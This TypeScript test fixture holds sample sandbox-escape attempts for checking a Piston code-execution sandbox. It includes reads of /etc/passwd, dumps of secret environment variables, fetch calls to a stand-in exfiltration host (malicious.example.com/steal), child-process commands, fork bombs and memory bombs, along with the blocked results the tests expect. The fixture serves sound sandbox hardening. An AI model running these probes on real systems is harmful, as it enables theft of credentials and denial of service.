/**
 * Collection of malicious code samples for security testing
 *
 * WARNING: DO NOT execute these outside of isolated test environments!
 * These samples are designed to test sandbox security and should only
 * be run in controlled Piston containers.
 *
 * @see __tests__/integration/piston-security.test.ts for usage examples
 */

export const maliciousCodeSamples = {
  /**
   * File system access attempts
   * Tests: Should be blocked or return empty/error
   */
  fileSystemAccess: {
    javascript: `
const fs = require('fs');
try {
  const data = fs.readdirSync('/');
  console.log('Root directory:', data);
} catch (err) {
  console.log('Access denied:', err.message);
}
    `.trim(),

    python: `
import os
try:
    data = os.listdir('/')
    print('Root directory:', data)
except Exception as e:
    print('Access denied:', str(e))
    `.trim(),

    javascriptReadPasswd: `
const fs = require('fs');
try {
  const passwd = fs.readFileSync('/etc/passwd', 'utf8');
  console.log(passwd);
} catch (err) {
  console.log('Error:', err.message);
}
    `.trim(),
  },

  /**
   * Environment variable access attempts
   * Tests: Should not expose DATABASE_URL, secrets, etc.
   */
  environmentAccess: {
    javascript: `
console.log('ENV:', JSON.stringify(process.env, null, 2));
    `.trim(),

    python: `
import os
import json
print('ENV:', json.dumps(dict(os.environ), indent=2))
    `.trim(),

    javascriptSpecificVars: `
const secrets = {
  database: process.env.DATABASE_URL,
  authSecret: process.env.BETTER_AUTH_SECRET,
  ghSecret: process.env.GH_SECRET,
  pgPassword: process.env.POSTGRES_PASSWORD,
};
console.log('Secrets:', JSON.stringify(secrets));
    `.trim(),
  },

  /**
   * Network request attempts
   * Tests: Should be blocked or timeout
   */
  networkRequest: {
    javascript: `
fetch('http://malicious.example.com/steal?data=secrets')
  .then(res => console.log('Success:', res.status))
  .catch(err => console.log('Failed:', err.message));
    `.trim(),

    python: `
import urllib.request
try:
    response = urllib.request.urlopen('http://malicious.example.com/steal')
    print('Success:', response.status)
except Exception as e:
    print('Failed:', str(e))
    `.trim(),

    javascriptHttps: `
const https = require('https');
https.get('https://malicious.example.com', (res) => {
  console.log('Success:', res.statusCode);
}).on('error', (err) => {
  console.log('Failed:', err.message);
});
    `.trim(),
  },

  /**
   * Child process spawning attempts
   * Tests: Should fail or be restricted
   */
  childProcess: {
    javascript: `
const { exec } = require('child_process');
exec('cat /etc/passwd', (error, stdout, stderr) => {
  if (error) {
    console.log('Error:', error.message);
    return;
  }
  console.log('Output:', stdout);
});
    `.trim(),

    python: `
import subprocess
try:
    result = subprocess.run(['cat', '/etc/passwd'], 
                          capture_output=True, text=True)
    print('Output:', result.stdout)
except Exception as e:
    print('Error:', str(e))
    `.trim(),

    javascriptSpawn: `
const { spawn } = require('child_process');
const ls = spawn('ls', ['/']);
ls.stdout.on('data', (data) => console.log(data.toString()));
ls.on('error', (err) => console.log('Error:', err.message));
    `.trim(),
  },

  /**
   * Resource exhaustion - Infinite loops
   * Tests: Should timeout after ~10 seconds
   */
  infiniteLoop: {
    javascript: `
while(true) {
  // Infinite CPU consumption
}
    `.trim(),

    python: `
while True:
    pass  # Infinite CPU consumption
    `.trim(),

    javascriptBusyLoop: `
let count = 0;
while(true) {
  count++;
  if (count % 1000000 === 0) {
    // Still going...
  }
}
    `.trim(),
  },

  /**
   * Resource exhaustion - Memory bombs
   * Tests: Should be killed when exceeding memory limit
   */
  memoryBomb: {
    javascript: `
const arr = [];
try {
  while(true) {
    arr.push(new Array(1000000).fill('x'));
  }
} catch(err) {
  console.log('Memory limit reached:', err.message);
}
    `.trim(),

    python: `
arr = []
try:
    while True:
        arr.append([0] * 1000000)
except Exception as e:
    print('Memory limit reached:', str(e))
    `.trim(),

    javascriptStringBomb: `
let str = '';
try {
  while(true) {
    str += 'x'.repeat(1000000);
  }
} catch(err) {
  console.log('Memory limit:', err.message);
}
    `.trim(),
  },

  /**
   * Resource exhaustion - Fork bombs
   * Tests: Should fail or limit process creation
   */
  forkBomb: {
    javascript: `
function fork() {
  fork();
  fork();
}
try {
  fork();
} catch(err) {
  console.log('Fork bomb prevented:', err.message);
}
    `.trim(),

    python: `
import os
try:
    while True:
        os.fork()
except Exception as e:
    print('Fork bomb prevented:', str(e))
    `.trim(),
  },

  /**
   * Resource exhaustion - Output flooding
   * Tests: Should truncate output to ~10MB
   */
  outputFlood: {
    javascript: `
for(let i = 0; i < 100000; i++) {
  console.log('x'.repeat(1000));
}
    `.trim(),

    python: `
for i in range(100000):
    print('x' * 1000)
    `.trim(),

    javascriptInfiniteOutput: `
while(true) {
  console.log('Flooding output buffer...');
}
    `.trim(),
  },

  /**
   * Module/require restrictions
   * Tests: Dangerous modules should be unavailable or neutered
   */
  dangerousModules: {
    javascript: `
try {
  const child_process = require('child_process');
  const fs = require('fs');
  const net = require('net');
  const http = require('http');
  console.log('Modules available:', {
    child_process: !!child_process,
    fs: !!fs,
    net: !!net,
    http: !!http,
  });
} catch(err) {
  console.log('Module loading restricted:', err.message);
}
    `.trim(),

    pythonDangerousImports: `
try:
    import os
    import subprocess
    import socket
    print('Modules available: os, subprocess, socket')
except ImportError as e:
    print('Import restricted:', str(e))
    `.trim(),
  },
};

/**
 * Expected behaviors for test assertions
 */
export const expectedBehaviors = {
  fileSystemAccess: {
    shouldNotContain: ["root:x:", "/etc/passwd", "bin", "usr"],
    shouldContain: ["Access denied", "ENOENT", "Permission denied", "Error"],
  },
  environmentAccess: {
    shouldNotContain: [
      "DATABASE_URL",
      "BETTER_AUTH_SECRET",
      "GH_SECRET",
      "POSTGRES_PASSWORD",
      "postgresql://",
    ],
  },
  networkRequest: {
    shouldContain: ["Failed", "timeout", "network", "ENOTFOUND"],
  },
  childProcess: {
    shouldNotContain: ["root:x:", "/etc/passwd"],
    shouldContain: ["Error", "denied", "not found"],
  },
  infiniteLoop: {
    shouldContain: ["timeout", "killed", "exceeded"],
    maxDuration: 15000, // 15 seconds max (including overhead)
  },
  memoryBomb: {
    shouldContain: ["memory", "killed", "limit", "heap", "Killed", "memoryerror"],
  },
  outputFlood: {
    maxOutputSize: 10 * 1024 * 1024, // 10MB
    shouldContain: ["truncated", "limit"],
  },
};
